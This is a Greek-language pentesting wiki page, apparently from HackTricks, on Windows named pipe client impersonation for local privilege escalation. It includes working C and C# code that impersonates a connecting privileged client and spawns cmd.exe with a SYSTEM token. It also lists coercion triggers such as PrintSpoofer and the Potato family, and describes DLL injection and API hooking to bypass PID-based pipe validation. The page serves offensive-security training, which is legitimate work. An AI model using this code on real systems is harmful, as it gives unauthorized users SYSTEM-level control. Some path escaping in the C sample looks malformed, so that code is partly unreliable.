# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation είναι ένας μηχανισμός τοπικής κλιμάκωσης προνομίων που επιτρέπει σε ένα server thread του named-pipe να υιοθετήσει το security context ενός client που συνδέεται σε αυτό. Στην πράξη, ένας επιτιθέμενος που μπορεί να εκτελέσει κώδικα με SeImpersonatePrivilege μπορεί να εξαναγκάσει έναν προνομιούχο client (π.χ. μια υπηρεσία SYSTEM) να συνδεθεί σε ένα pipe που ελέγχει ο επιτιθέμενος, να καλέσει ImpersonateNamedPipeClient, να διπλασιάσει το προκύπτον token σε primary token και να spawn-άρει μια διεργασία ως ο client (συχνά NT AUTHORITY\SYSTEM).

Αυτή η σελίδα επικεντρώνεται στην κύρια τεχνική. Για end-to-end exploit chains που εξαναγκάζουν SYSTEM να συνδεθεί στο pipe σας, δείτε τις σελίδες της οικογένειας Potato που αναφέρονται παρακάτω.

## TL;DR
- Δημιουργήστε ένα named pipe: \\.\pipe\<random> και περιμένετε για σύνδεση.
- Κάντε ένα προνομιούχο component να συνδεθεί σε αυτό (spooler/DCOM/EFSRPC/etc.).
- Διαβάστε τουλάχιστον ένα μήνυμα από το pipe, στη συνέχεια καλέστε ImpersonateNamedPipeClient.
- Ανοίξτε το impersonation token από το τρέχον νήμα, DuplicateTokenEx(TokenPrimary), και χρησιμοποιήστε CreateProcessWithTokenW/CreateProcessAsUser για να ξεκινήσετε μια διεργασία ως SYSTEM.

## Requirements and key APIs
- Τα προνόμια που συνήθως χρειάζεται η καλούσα διαδικασία/νήμα:
- SeImpersonatePrivilege για να γίνει επιτυχώς impersonate σε έναν συνδεόμενο client και για να χρησιμοποιηθεί CreateProcessWithTokenW.
- Εναλλακτικά, αφού έχετε impersonate-άρει SYSTEM, μπορείτε να χρησιμοποιήσετε CreateProcessAsUser, το οποίο μπορεί να απαιτεί SeAssignPrimaryTokenPrivilege και SeIncreaseQuotaPrivilege (αυτά ικανοποιούνται όταν impersonate-άρετε SYSTEM).
- Βασικά APIs που χρησιμοποιούνται:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (πρέπει να διαβαστεί τουλάχιστον ένα μήνυμα πριν το impersonation)
- ImpersonateNamedPipeClient και RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Επίπεδο impersonation: για να εκτελεστούν χρήσιμες ενέργειες τοπικά, ο client πρέπει να επιτρέπει SecurityImpersonation (προεπιλογή για πολλούς τοπικούς RPC/named-pipe clients). Οι clients μπορούν να μειώσουν αυτό με SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION κατά το άνοιγμα του pipe.

## Ελάχιστη ροή εργασίας Win32 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Σημειώσεις:
- Εάν η ImpersonateNamedPipeClient επιστρέψει ERROR_CANNOT_IMPERSONATE (1368), βεβαιωθείτε ότι έχετε διαβάσει πρώτα από το pipe και ότι ο client δεν έχει περιορίσει την impersonation στο Identification level.
- Προτιμήστε το DuplicateTokenEx με SecurityImpersonation και TokenPrimary για να δημιουργήσετε ένα primary token κατάλληλο για δημιουργία διεργασίας.

## .NET γρήγορο παράδειγμα
Στο .NET, το NamedPipeServerStream μπορεί να impersonate μέσω του RunAsClient. Μόλις γίνει impersonation, αντιγράψτε το thread token και δημιουργήστε μια διεργασία.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Συνήθεις triggers/coercions για να φέρετε το SYSTEM στο pipe σας
Αυτές οι τεχνικές εξαναγκάζουν υπηρεσίες με προνόμια να συνδεθούν στο named pipe σας ώστε να μπορείτε να τις impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Δείτε λεπτομερή χρήση και συμβατότητα εδώ:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Αν χρειάζεστε ένα πλήρες παράδειγμα κατασκευής του pipe και impersonating για να spawn SYSTEM από ένα service trigger, δείτε:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Οι υπηρεσίες hardened με named-pipe μπορούν ακόμα να καταληφθούν με τη διεμβολή του trusted client. Εργαλεία όπως [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) ρίχνουν ένα helper DLL στον client, προωθούν την κίνησή του, και σας επιτρέπουν να παραποιήσετε privileged IPC πριν η υπηρεσία SYSTEM το καταναλώσει.

### Inline API hooking inside trusted processes
- Εισάγετε το helper DLL (OpenProcess → CreateRemoteThread → LoadLibrary) σε οποιονδήποτε client.
- Το DLL χρησιμοποιεί Detours για `ReadFile`, `WriteFile`, κ.λπ., αλλά μόνο όταν το `GetFileType` αναφέρει `FILE_TYPE_PIPE`. Αντιγράφει κάθε buffer/metadata σε ένα control pipe, σας επιτρέπει να το επεξεργαστείτε/απορρίψετε/αναπαράγετε, και μετά επαναφέρει το αρχικό API.
- Μετατρέπει τον νόμιμο client σε proxy τύπου Burp: παύση UTF-8/UTF-16/raw payloads, πρόκληση error paths, αναπαραγωγή ακολουθιών, ή εξαγωγή JSON traces.

### Remote client mode to defeat PID-based validation
- Εισάγετε σε έναν allow-listed client, μετά στο GUI επιλέξτε το pipe και το PID.
- Το DLL καλεί `CreateFile`/`ConnectNamedPipe` μέσα στη trusted process και προωθεί το I/O πίσω σε εσάς, έτσι ο server εξακολουθεί να βλέπει το νόμιμο PID/image.
- Παρακάμπτει φίλτρα που βασίζονται σε `GetNamedPipeClientProcessId` ή ελέγχους signed-image.

### Fast enumeration and fuzzing
- `pipelist` απαριθμεί `\\.\pipe\*`, δείχνει ACLs/SIDs, και προωθεί καταχωρήσεις σε άλλα modules για άμεσο probing.
- Ο pipe client/message composer συνδέεται σε οποιοδήποτε όνομα και δημιουργεί UTF-8/UTF-16/raw-hex payloads· εισάγετε captured blobs, μεταβάλετε πεδία, και επαναποστείλετε για να κυνηγήσετε deserializers ή unauthenticated command verbs.
- Το helper DLL μπορεί να φιλοξενήσει έναν loopback TCP listener ώστε εργαλεία/fuzzers να οδηγήσουν το pipe απομακρυσμένα μέσω του Python SDK.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Συνδύασε τη γέφυρα TCP με επαναφορές στιγμιότυπων VM για να δοκιμάσεις την αντοχή ευπαθών αναλυτών IPC.

### Λειτουργικές παρατηρήσεις
- Τα named pipes έχουν χαμηλή καθυστέρηση· μεγάλες παύσεις κατά την επεξεργασία των buffers μπορούν να προκαλέσουν deadlock σε ευπαθείς υπηρεσίες.
- Η κάλυψη για overlapped/completion-port I/O είναι μερική, οπότε να περιμένετε οριακές περιπτώσεις.
- Το injection είναι θορυβώδες και unsigned, οπότε αντιμετωπίστε το ως εργαλείο για lab/exploit-dev και όχι ως stealth implant.

## Αντιμετώπιση προβλημάτων και παγίδες
- Πρέπει να διαβάσετε τουλάχιστον ένα μήνυμα από το pipe πριν καλέσετε ImpersonateNamedPipeClient· αλλιώς θα λάβετε ERROR_CANNOT_IMPERSONATE (1368).
- Αν ο client συνδεθεί με SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, ο server δεν μπορεί να εκτελέσει πλήρη impersonation· ελέγξτε το επίπεδο impersonation του token μέσω GetTokenInformation(TokenImpersonationLevel).
- Το CreateProcessWithTokenW απαιτεί SeImpersonatePrivilege στον caller. Αν αυτό αποτύχει με ERROR_PRIVILEGE_NOT_HELD (1314), χρησιμοποιήστε CreateProcessAsUser αφού ήδη έχετε impersonate το SYSTEM.
- Βεβαιωθείτε ότι ο security descriptor του pipe επιτρέπει στην στοχευόμενη υπηρεσία να συνδεθεί αν τον ενισχύσετε· από προεπιλογή, τα pipes υπό \\.\pipe είναι προσβάσιμα σύμφωνα με τη DACL του server.

## Αναφορές
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
